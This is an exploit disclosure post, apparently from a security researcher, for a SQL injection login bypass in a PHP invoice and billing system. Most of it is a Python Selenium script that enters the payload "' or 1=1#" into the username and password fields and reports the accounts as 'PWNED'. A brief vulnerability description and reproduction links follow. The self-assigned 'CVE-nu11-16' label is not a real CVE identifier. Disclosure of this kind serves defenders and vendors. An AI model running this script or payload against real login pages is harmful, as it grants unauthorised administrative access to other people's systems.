### Exploit Title0: © 2021 Rupee Invoice System - Mayuri K | Designed by : Mayurik K is vulnerable to remote SQL-Injection-Bypass-Authentication.
### Author: nu11secur1ty
### Testing and Debugging: nu11secur1ty 
### Date: 09.21.2021
### Vendor: https://www.sourcecodester.com/users/mayurik
### Link: https://www.sourcecodester.com/php/14831/billing-system-project-php-source-code-free-download.html
### CVE: CVE-nu11-16

[+] Exploit Source: 

#!/usr/bin/python3
# Author: @nu11secur1ty
# Debug and Developement: @nu11secur1ty 
# CVE-nu11-16

from selenium import webdriver
import time
import os
from colorama import init, Fore, Back, Style
init(convert=True)


#enter the link to the website you want to automate login.
### 0
website_link0="http://192.168.1.180/phpinventory/phpinventory/login.php"

#enter your login username
username0="nu11secur1ty' or 1=1#"

#enter your login password
password0="nu11secur1ty' or 1=1#"

#enter the element for username input field
element_for_username0="username"
#enter the element for password input field
element_for_password0="password"

browser = webdriver.Chrome()
browser.get((website_link0))	


try:
	### 0
	username_element = browser.find_element_by_name(element_for_username0)
	username_element.send_keys(username0)		
	password_element  = browser.find_element_by_name(element_for_password0)
	password_element.send_keys(password0)
	browser.maximize_window()
	time.sleep(1)
	browser.execute_script("document.querySelector('[name=\"login\"]').click()")
	
	print(Fore.RED + 'The payload for CVE-nu11-16 is deployed and all these three accounts are PWNED by SQL - Injection...\n')
	print(Style.RESET_ALL)
	
except Exception:
	#### This exception occurs if the element are not found in the webpage.
	print("Some error occured :(")

------------------------------------------------------------------

### Description:
The © 2021 Rupee Invoice System - Mayuri K | Designed by : Mayurik K is vulnerable from remote SQL-Injection-Bypass-Authentication. 
remote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. 
The parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. 
When the user will sending a malicious query or malicious payload to the MySQL server for those three accounts, he can bypass the login credentials and take control of admin account.

-------------------------------------------------------------------
### BR 
- [+] @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer

-------------------------------------------------------------------
### Reproduce: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/mayuri_k
### Proof: https://streamable.com/651qro
### BR nu11secur1ty
